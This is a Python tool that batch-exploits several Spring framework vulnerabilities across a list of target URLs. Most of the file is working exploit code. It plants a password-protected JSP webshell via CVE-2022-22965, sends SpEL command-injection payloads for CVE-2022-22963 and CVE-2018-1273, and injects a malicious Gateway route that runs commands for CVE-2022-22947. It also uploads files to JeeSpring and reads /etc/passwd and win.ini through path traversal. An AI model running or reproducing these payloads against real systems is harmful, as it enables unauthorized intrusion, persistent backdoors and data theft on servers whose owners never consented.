#!/usr/bin/env python
# coding=utf-8
  ################
 #   AabyssZG   #
################

import requests, sys, json, re, random, base64
from termcolor import cprint
from time import sleep
import urllib3
urllib3.disable_warnings()
requests.timeout = 10

ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
      "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00"]

def CVE_2022_22965(url, proxies):
    Headers_1 = {
        "User-Agent": random.choice(ua),
        "suffix": "%>//",
        "c1": "Runtime",
        "c2": "<%",
        "DNT": "1",
        "Content-Type": "application/x-www-form-urlencoded"
        }
    payload_linux = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22tomcat%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    payload_win = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22tomcat%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    payload_http = """?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22tomcat%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
    data1 = payload_linux
    data2 = payload_win
    getpayload = url + payload_http
    try:
        requests.packages.urllib3.disable_warnings()
        requests.post(url, headers=Headers_1, data=data1, allow_redirects=False, verify=False, proxies=proxies)
        sleep(0.5)
        requests.post(url, headers=Headers_1, data=data2, allow_redirects=False, verify=False, proxies=proxies)
        sleep(0.5)
        requests.get(getpayload, headers=Headers_1, allow_redirects=False, verify=False, proxies=proxies)
        sleep(0.5)
        test = requests.get(url + "tomcatwar.jsp", allow_redirects=False, verify=False, proxies=proxies)
        if (test.status_code == 200):
            cprint("[+] [CVE-2022-22965] Webshell为：" + url + "tomcatwar.jsp?pwd=tomcat&cmd=whoami" ,"red")
            f2 = open("vulout.txt", "a")
            f2.write("[+] [CVE-2022-22965] " + url + "tomcatwar.jsp?pwd=tomcat&cmd=whoami" + '\n')
            f2.close()
        else:
            cprint("[-] 目标 " + url + " 验证CVE-2022-22965漏洞不存在或者已经被利用","yellow")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 验证CVE-2022-22965漏洞发生错误，已记入日志error.log")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

def CVE_2022_22963(url, proxies):
    payload = f'T(java.lang.Runtime).getRuntime().exec("whoami")'

    data = 'test'
    header = {
        'spring.cloud.function.routing-expression': payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': random.choice(ua),
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = 'functionRouter'
    
    try:
        urltest = url + path
        requests.packages.urllib3.disable_warnings()
        req = requests.post(url=urltest, headers=header, data=data, verify=False, proxies=proxies)
        code = req.status_code
        text = req.text
        rsp = '"error":"Internal Server Error"'
        if (code == 500) and (rsp in text):
            cprint(f'[+] [CVE-2022-22963] {url}，请手动反弹Shell', "red")
            f2 = open("vulout.txt", "a")
            f2.write("[+] [CVE-2022-22963] " + url + '\n')
            f2.close()
        else:
            cprint("[-] 目标 " + url + " 验证CVE-2022-22963漏洞不存在", "yellow")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 验证CVE-2022-22963漏洞发生错误，已记入日志error.log")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

def CVE_2022_22947(url, proxies):
    headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': random.choice(ua),
        'Content-Type': 'application/json'
    }

    headers2 = {
        'User-Agent': random.choice(ua),
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    payload_windows = '''{\r
              "id": "hacktest",\r
              "filters": [{\r
                "name": "AddResponseHeader",\r
                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"dir\\"}).getInputStream()))}"}\r
                }],\r
              "uri": "http://example.com",\r
              "order": 0\r
            }'''
    payload_linux = payload_windows.replace('dir', 'id')

    try:
        requests.packages.urllib3.disable_warnings()
        re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_linux, headers=headers1, json=json ,verify=False, proxies=proxies)
        re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
        re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
        if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
            cprint(f'[+] [CVE-2022-22947] {url}', "red")
            f2 = open("vulout.txt", "a")
            f2.write("[+] [CVE-2022-22947] " + url + '\n')
            f2.close()
        else:
            re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
            re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
            re1 = requests.post(url=url + "actuator/gateway/routes/hacktest", data=payload_windows, headers=headers1, json=json ,verify=False, proxies=proxies)
            re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2 ,verify=False, proxies=proxies)
            re3 = requests.get(url=url + "actuator/gateway/routes/hacktest", headers=headers2 ,verify=False, proxies=proxies)
            if ('<DIR>' in str(re3.text)):
                cprint(f'[+] [CVE-2022-22947] {url}', "red")
                f2 = open("vulout.txt", "a")
                f2.write("[+] [CVE-2022-22947] " + url + '\n')
                f2.close()
            else:
                cprint("[-] 目标 " + url + " 验证CVE-2022-22947漏洞不存在", "yellow")
                re4 = requests.delete(url=url + "actuator/gateway/routes/hacktest", headers=headers2, verify=False, proxies=proxies)
                re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, verify=False, proxies=proxies)
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 验证CVE-2022-22947漏洞发生错误，已记入日志error.log")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

def JeeSpring_2023(url,proxies):
    headers1 = {
        'User-Agent': random.choice(ua),
        'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundarycdUKYcs7WlAxx9UL',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apn g,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'zh-CN,zh;q=0.9,ja;q=0.8',
        'Connection': 'close'
    }

    payload2 = b'LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnRsbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo='
    payload = base64.b64decode(payload2)
    path = 'static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/'
    
    try:
        requests.packages.urllib3.disable_warnings()
        re1 = requests.post(url=url + path, data=payload, headers=headers1, verify=False, proxies=proxies)
        code1 = re1.status_code
        if ('jsp' in str(re1.text)) and (int(code1) == 200):
            cprint(f'[+] [JeeSpring_2023] {url}', "red")
            f2 = open("vulout.txt", "a")
            f2.write("[+] [JeeSpring_2023] " + url + '\n')
            f2.close()
        else:
            cprint("[-] 目标 " + url + " 验证2023JeeSpring任意文件上传漏洞不存在", "yellow")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 验证2023JeeSpring文件上传漏洞发生错误，已记入日志error.log")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

def JolokiaRCE(url,proxies):
    path1 = 'jolokia'
    path2 = 'actuator/jolokia'
    path3 = 'jolokia/list'
    
    try:
        requests.packages.urllib3.disable_warnings()
        re1 = requests.post(url=url + path1, allow_redirects=False, verify=False, proxies=proxies)
        code1 = re1.status_code
        re2 = requests.post(url=url + path2, allow_redirects=False, verify=False, proxies=proxies)
        code2 = re2.status_code
        if ((int(code1) == 200) or (int(code2) == 200)):
            retest = requests.get(url=url + path3, verify=False, proxies=proxies)
            code3 = retest.status_code
            if ('reloadByURL' in str(retest.text)) and (code3 == 200):
                cprint(f'[+] [Jolokia-Realm-JNDI-RCE-1] {url}', "red")
                f2 = open("vulout.txt", "a")
                f2.write("[+] [Jolokia-Realm-JNDI-RCE-1] " + url + '\n')
                f2.close()
            elif ('createJNDIRealm' in str(retest.text)) and (code3 == 200):
                cprint(f'[+] [Jolokia-Realm-JNDI-RCE-2] {url}', "red")
                f2 = open("vulout.txt", "a")
                f2.write("[+] [Jolokia-Realm-JNDI-RCE-2] " + url + '\n')
                f2.close()
        else:
            cprint("[-] 目标 " + url + " 验证Jolokia系列RCE漏洞不存在", "yellow")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 验证Jolokia系列RCE漏洞发生错误，已记入日志error.log")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

def CVE_2021_21234(url,proxies):
    payload1 = 'manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
    payload2 = 'log/view?filename=/windows/win.ini&base=../../../../../../../../../../'
    payload3 = 'manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../'
    payload4 = 'log/view?filename=/etc/passwd&base=../../../../../../../../../../'

    try:
        requests.packages.urllib3.disable_warnings()
        re1 = requests.post(url=url + payload1, verify=False, proxies=proxies)
        re2 = requests.post(url=url + payload2, verify=False, proxies=proxies)
        re3 = requests.post(url=url + payload3, verify=False, proxies=proxies)
        re4 = requests.post(url=url + payload4, verify=False, proxies=proxies)
        if (('MAPI' in str(re1.text)) or ('MAPI' in str(re2.text))):
            cprint(f'[+] [CVE-2021-21234-Win] {url}', "red")
            f2 = open("vulout.txt", "a")
            f2.write("[+] [CVE-2021-21234-Win] " + url + '\n')
            f2.close()
        elif (('root:x:' in str(re3.text)) or ('root:x:' in str(re4.text))):
            cprint(f'[+] [CVE-2021-21234-Linux] {url}', "red")
            f2 = open("vulout.txt", "a")
            f2.write("[+] [CVE-2021-21234-Linux] " + url + '\n')
            f2.close()
        else:
            cprint("[-] 目标 " + url + " 验证Spring Boot目录遍历漏洞不存在", "yellow")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 验证Spring Boot目录遍历漏洞发生错误，已记入日志error.log")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

def SnakeYAML_RCE(url,proxies):
    Headers_1 = {
        "User-Agent": random.choice(ua),
        "Content-Type": "application/x-www-form-urlencoded"
        }
    Headers_2 = {
        "User-Agent": random.choice(ua),
        "Content-Type": "application/json"
        }
    payload_1 = "spring.cloud.bootstrap.location=http://127.0.0.1/example.yml"
    payload_2 = "{\"name\":\"spring.main.sources\",\"value\":\"http://127.0.0.1/example.yml\"}"
    path = 'env'
    
    try:
        requests.packages.urllib3.disable_warnings()
        urltest = url + path
        re1 = requests.post(url=urltest, headers=Headers_1, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
        re2 = requests.post(url=urltest, headers=Headers_2, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
        if ('example.yml' in str(re1.text)):
            cprint(f'[+] [SnakeYAML_RCE-1] {url}', "red")
            f2 = open("vulout.txt", "a")
            f2.write("[+] [SnakeYAML_RCE-1] " + url + '\n')
            f2.close()
        elif ('example.yml' in str(re2.text)):
            cprint(f'[+] [SnakeYAML_RCE-2] {url}', "red")
            f2 = open("vulout.txt", "a")
            f2.write("[+] [SnakeYAML_RCE-2] " + url + '\n')
            f2.close()
        else:
            cprint("[-] 目标 " + url + " 验证SnakeYAML-RCE漏洞不存在", "yellow")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 验证SnakeYAML-RCE漏洞发生错误，已记入日志error.log")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

def Eureka_xstream_RCE(url,proxies):
    Headers_1 = {
        "User-Agent": random.choice(ua),
        "Content-Type": "application/x-www-form-urlencoded"
        }
    Headers_2 = {
        "User-Agent": random.choice(ua),
        "Content-Type": "application/json"
        }
    payload_1 = "eureka.client.serviceUrl.defaultZone=http://127.0.0.2/example.yml"
    payload_2 = "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://127.0.0.2/example.yml\"}"
    path1 = 'env'
    path2 = 'actuator/env'
    
    try:
        requests.packages.urllib3.disable_warnings()
        urltest1 = url + path1
        urltest2 = url + path2
        re1 = requests.post(url=urltest1, headers=Headers_1, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
        re2 = requests.post(url=urltest2, headers=Headers_2, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
        if ('127.0.0.2' in str(re1.text)):
            cprint(f'[+] [Eureka_Xstream-1] {url}', "red")
            f2 = open("vulout.txt", "a")
            f2.write("[+] [Eureka_Xstream-1] " + url + '\n')
            f2.close()
        elif ('127.0.0.2' in str(re2.text)):
            cprint(f'[+] [Eureka_Xstream-2] {url}', "red")
            f2 = open("vulout.txt", "a")
            f2.write("[+] [Eureka_Xstream-2] " + url + '\n')
            f2.close()
        else:
            cprint("[-] 目标 " + url + " 验证Eureka_Xstream反序列化漏洞不存在", "yellow")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 验证Eureka_Xstream反序列化漏洞发生错误，已记入日志error.log")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

def CVE_2018_1273(url,proxies):
    Headers = {
        "User-Agent": random.choice(ua),
        "Content-Type": "application/x-www-form-urlencoded"
        }
    path1 = 'users'
    path2 = 'users?page=0&size=5'
    payload1 = "username[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\")]=chybeta&password=chybeta&repeatedPassword=chybeta"
    payload2 = "username[#this.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec('whoami')\")]=asdf"
    try:
        requests.packages.urllib3.disable_warnings()
        urltest1 = url + path1
        urltest2 = url + path2
        re1 = requests.get(url=urltest1, headers=Headers, allow_redirects=False, verify=False, proxies=proxies)
        code1 = re1.status_code
        if ((int(code1) == 200) and ('Users' in str(re1.text))):
            cprint(f'[+] [CVE-2018-1273] {url}', "red")
            f2 = open("vulout.txt", "a")
            f2.write("[+] [CVE-2018-1273] " + url + '\n')
            f2.close()
        else:
            cprint("[-] 目标 " + url + " 验证Spring_Data_Commons远程命令执行漏洞不存在", "yellow")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except Exception as e:
        print("[-] 验证Spring_Data_Commons RCE漏洞发生错误，已记入日志error.log")
        f2 = open("error.log", "a")
        f2.write(str(e) + '\n')
        f2.close()

def FileRead(filename):
    try:
        f =open(filename)   #打开目标文件
        f.close()
    except FileNotFoundError:
        cprint ("未找到同目录下的TXT文件，请确保放在一个目录下", "magenta")   #如果未找到文件，输出错误
        sys.exit()
    except PermissionError:
        cprint ("无法读取TXT文件（无权限访问）", "magenta")   #如果发现目标文件无权限，输出错误
        sys.exit()

def poc(filename,proxies):
    f1 = open("vulout.txt", "wb+")
    f1.close()
    functions = {
        1: JeeSpring_2023,
        2: CVE_2022_22947,
        3: CVE_2022_22963,
        4: CVE_2022_22965,
        5: CVE_2021_21234,
        6: SnakeYAML_RCE,
        7: Eureka_xstream_RCE,
        8: JolokiaRCE,
        9: CVE_2018_1273,
    }
    cprint("[+] 获取TXT名字为：" + filename,"green")
    FileRead(filename)
    cprint("[+] 目前漏洞库内容如下：","green")
    for num, func in functions.items():
        print(f" {num}: {func.__name__}")
    try:
        choices = input("\n请输入要批量检测的漏洞 (例子：1,3,5 直接回车即检测全部漏洞): ")
        if choices == '':
            choices = "1,2,3,4,5,6,7,8,9"
        choices = [int(choice) for choice in choices.split(',')]
    except Exception as e:
        print("请不要输入无意义的字符串")
        sys.exit()
    with open(filename, 'r') as temp:
        for url in temp.readlines():
            url = url.strip()
            if ('://' not in url):
                url = str("http://") + str(url)
            if str(url[-1]) != "/":
                url = url + "/"
            try:
                requests.packages.urllib3.disable_warnings()
                r = requests.get(url, verify=False, proxies=proxies)
                if r.status_code == 503:
                    continue
            except KeyboardInterrupt:
                print("Ctrl + C 手动终止了进程")
                sys.exit()
            except:
                cprint("[-] URL为 " + url + " 的目标积极拒绝请求，予以跳过！", "magenta")
                continue
            for choice in choices:
                selected_func = functions.get(choice)
                if selected_func:
                    selected_func(url, proxies)
                else:
                    print(f"{choice} 输入错误，请重新输入漏洞选择模块\n")
                    break
    cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "red")
    sys.exit()
